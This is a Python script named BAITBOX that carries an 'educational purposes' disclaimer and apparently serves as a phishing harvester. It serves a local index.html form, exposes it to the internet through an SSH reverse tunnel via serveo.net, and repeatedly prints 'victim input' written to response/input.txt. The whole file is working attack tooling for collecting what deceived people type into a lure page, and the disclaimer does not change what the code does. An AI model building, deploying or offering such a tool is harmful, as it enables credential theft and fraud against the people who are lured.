import os
import subprocess
import time
import random

# Disclaimer
print("""
========================================================================================
DISCLAIMER ⚠️
========================================================================================
This script was created strictly for educational purposes. Any unauthorized or illegal
activities conducted using this tool are solely the responsibility of the user.
The creator is not responsible for any misuse or damage caused by the use of this tool.

Always ensure you have explicit permission before accessing or using systems.

AUTHOR: uthman dev
LICENSE: GNU General Public License v3.0
========================================================================================
""")

# Clear the console screen based on the OS
os.system('cls' if os.name == 'nt' else 'clear')

# Ensure script is running in CLI mode (Python naturally does in most cases)

# Print ASCII art in red
ascii_art = """
\033[31m
██████╗  █████╗ ██╗████████╗██████╗  ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██║╚══██╔══╝██╔══██╗██╔═══██╗╚██╗██╔╝
██████╔╝███████║██║   ██║   ██████╔╝██║   ██║ ╚███╔╝ 
██╔══██╗██╔══██║██║   ██║   ██╔══██╗██║   ██║ ██╔██╗ 
██████╔╝██║  ██║██║   ██║   ██████╔╝╚██████╔╝██╔╝ ██╗
╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                     
\033[0m
"""
print(ascii_art)
print("\033[31mNote: For Educational Purposes Only\033[0m")

# Function to get a random port
def get_random_port():
    return random.randint(1024, 65535)

# Define the local server host and port
host = "localhost"
port = get_random_port()

# Capture the start time for server startup performance measurement
start_time = time.time()

# Start the built-in Python HTTP server in the background
server_process = subprocess.Popen(f"python -m http.server {port} --bind {host}",
                                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Capture the end time after server startup
end_time = time.time()

# Calculate the time taken to start the server in milliseconds
time_taken = (end_time - start_time) * 1000

# Check if the server started successfully
if server_process:
    print(f"Starting server on http://{host}:{port}")
    print(f"\033[32mServer started successfully in {round(time_taken, 2)} milliseconds.\033[0m")
else:
    print("\033[31mError: Server could not be started.\033[0m")

# Define the path to the form file (index.html)
form_file = "index.html"

# Check if the form file exists
if not os.path.exists(form_file):
    print("Error: The form file index.html is missing. Please create the form.")
    exit()

# Setup response directory and files for SSH output and user input handling
response_dir = "response"
input_file = os.path.join(response_dir, "input.txt")
ssh_output_file = os.path.join(response_dir, "ssh_output.txt")  # Store SSH output

# Create the response directory if it doesn't exist
if not os.path.exists(response_dir):
    os.makedirs(response_dir)

# Create input.txt and ssh_output.txt if they don't exist
if not os.path.exists(input_file):
    with open(input_file, 'w'):
        pass

if not os.path.exists(ssh_output_file):
    with open(ssh_output_file, 'w'):
        pass
    print(f"Created {ssh_output_file} for SSH output.")

# Establish an SSH tunnel using Serveo
print("\033[32mEstablishing SSH tunnel...\033[0m")
ssh_command = f"ssh -R 80:localhost:{port} serveo.net > {ssh_output_file} 2>&1 &"
subprocess.Popen(ssh_command, shell=True)

# Wait for the SSH tunnel to establish and fetch the tunnel URL
tunnel_url = None
while tunnel_url is None:
    if os.path.exists(ssh_output_file):
        with open(ssh_output_file, 'r') as file:
            lines = file.readlines()
            for line in lines:
                if "http" in line:
                    tunnel_url = line.strip()
                    print(f"\033[32mTunnel URL: {tunnel_url}\033[0m")
                    break
    time.sleep(1)  # Wait for SSH output to be written

# Start monitoring input from input.txt
print("\033[33mWaiting for victim input...\033[0m")
print("\033[34mPress Ctrl+C to stop.\033[0m")

try:
    while True:
        # Check for new input in input.txt
        if os.path.exists(input_file):
            with open(input_file, 'r') as file:
                input_content = file.read().strip()

            if input_content:
                print("-------------------------------------")
                print("Input received:")
                print(f"\033[32m{input_content}\033[0m")  # Display input in green
                print("-------------------------------------")

                # Clear the input file after reading
                with open(input_file, 'w'):
                    pass

        # Wait for 2 seconds before checking again
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\033[31mScript stopped by user.\033[0m")
